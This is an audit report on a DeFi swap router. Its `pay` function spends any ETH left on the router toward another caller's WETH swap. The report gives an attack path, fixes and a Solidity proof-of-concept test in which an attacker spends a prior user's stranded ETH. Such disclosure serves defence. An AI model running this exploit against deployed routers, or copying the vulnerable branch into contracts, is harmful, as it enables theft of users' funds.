Audit Report

## Title
Cross-User ETH Theft via Unattributed Router Native Balance in `PeripheryPayments.pay` Partial-ETH Branch — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
The `pay` function's partial-ETH branch unconditionally consumes the entire native ETH balance of the router to subsidize any WETH swap, with no attribution to the caller who deposited that ETH. Because `multicall` and all `exactInput*`/`exactOutput*` entry points are `payable` and no per-call ETH budget is tracked, excess ETH sent by one user can be silently stolen by a subsequent attacker who crafts a WETH swap with only partial approval.

## Finding Description
The root cause is in `PeripheryPayments.pay` at lines 78–81:

```solidity
} else if (nativeBalance > 0) {
    IWETH9(WETH).deposit{value: nativeBalance}();
    IERC20(WETH).safeTransfer(recipient, nativeBalance);
    IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
}
```

This branch fires whenever the router holds any ETH and the held amount is less than the requested `value`. It deposits and forwards **all** router ETH toward the current caller's swap, then pulls only the shortfall from `payer`. There is no check that the ETH consumed here was sent by the current caller in the current transaction.

**How ETH becomes stranded:** `multicall` (line 39) and `exactInputSingle` (line 67) are both `payable`. A user who calls `multicall{value: X}([exactInputSingle(amountIn: Y)])` where `X > Y` and omits `refundETH()` leaves `X - Y` ETH on the router. The test suite explicitly documents this pattern and the mandatory use of `refundETH()` to recover excess ETH.

The `receive()` guard (lines 32–34) only blocks direct ETH pushes from non-WETH addresses; it does not prevent ETH from accumulating via `payable` calls.

**No per-call ETH budget exists:** `MetricOmmSwapRouterBase` stores only pool address, callback mode, payer, token, trades-left, and amountIn in transient storage. There is no slot tracking how much ETH the current call is entitled to spend.

**Attack path:**
1. User A calls `multicall{value: 1 ETH}([exactInputSingle(tokenIn=WETH, amountIn=0.5 ETH)])` without `refundETH()`. After the call, 0.5 ETH is stranded on the router.
2. Attacker B calls `exactInputSingle(tokenIn=WETH, amountIn=1 ETH)` with `msg.value=0` and only 0.5 WETH approved.
3. The pool calls back → `metricOmmSwapCallback` → `_justPayCallback` → `pay(WETH, attackerB, pool, 1 ETH)`.
4. `nativeBalance = 0.5 ETH` → middle branch fires: router deposits User A's 0.5 ETH as WETH and transfers it to the pool, then pulls 0.5 WETH from Attacker B.
5. Pool receives the full 1 ETH worth of WETH. Attacker B's swap succeeds. User A's 0.5 ETH is permanently consumed.

## Impact Explanation
Direct, cross-user theft of stranded ETH principal. User A loses ETH they sent to the router; Attacker B receives a subsidized swap at User A's expense. The stolen amount equals the stranded ETH balance, which can be any value up to the full `msg.value` of User A's prior call. This is a High-severity direct loss of user funds.

## Likelihood Explanation
Medium-High. The precondition (ETH stranded on the router) is a well-known user error in Uniswap v3-style routers — users frequently send excess ETH without including `refundETH()`. The attack is permissionless, requires no privileged access, and can be executed in the very next block after ETH is stranded. An attacker can monitor the mempool or router balance and act immediately. The attack is repeatable as long as ETH accumulates on the router.

## Recommendation
The `pay` function must not consume ETH that was not sent by the current caller in the current transaction. Two complementary fixes:

1. **Track per-call ETH budget in transient storage:** Store `msg.value` in a dedicated transient slot at the start of each `exactInput*`/`exactOutput*` entry point. In `pay`, deduct consumed ETH from this budget and revert if the budget is exhausted.
2. **Enforce `msg.value` alignment at entry points:** When `tokenIn == WETH`, require `msg.value == 0 || msg.value == amountIn` and only allow the partial-ETH branch to consume ETH that arrived in the current call.

## Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

function test_crossUserEthTheft() public {
    uint128 amountIn = 1 ether;
    uint256 strandedEth = 0.5 ether;

    // User A: sends 1 ETH but only swaps 0.5 ETH, forgets refundETH()
    vm.prank(userA);
    bytes[] memory calls = new bytes[](1); // no refundETH
    calls[0] = abi.encodeWithSelector(
        router.exactInputSingle.selector,
        ExactInputSingleParams({
            pool: pool, tokenIn: WETH, tokenOut: token1,
            zeroForOne: true, amountIn: uint128(strandedEth),
            amountOutMinimum: 0, recipient: userA,
            deadline: type(uint256).max, priceLimitX64: 0, extensionData: ""
        })
    );
    router.multicall{value: amountIn}(calls);
    assertEq(address(router).balance, strandedEth, "ETH stranded");

    // Attacker B: approves only 0.5 WETH, sends 0 ETH, requests 1 ETH swap
    vm.prank(attackerB);
    weth.approve(address(router), strandedEth);
    router.exactInputSingle(
        ExactInputSingleParams({
            pool: pool, tokenIn: WETH, tokenOut: token1,
            zeroForOne: true, amountIn: uint128(amountIn),
            amountOutMinimum: 0, recipient: attackerB,
            deadline: type(uint256).max, priceLimitX64: 0, extensionData: ""
        })
    );
    // Attacker B's swap succeeds; user A's 0.5 ETH consumed
    assertEq(address(router).balance, 0, "user A's ETH stolen");
}
```
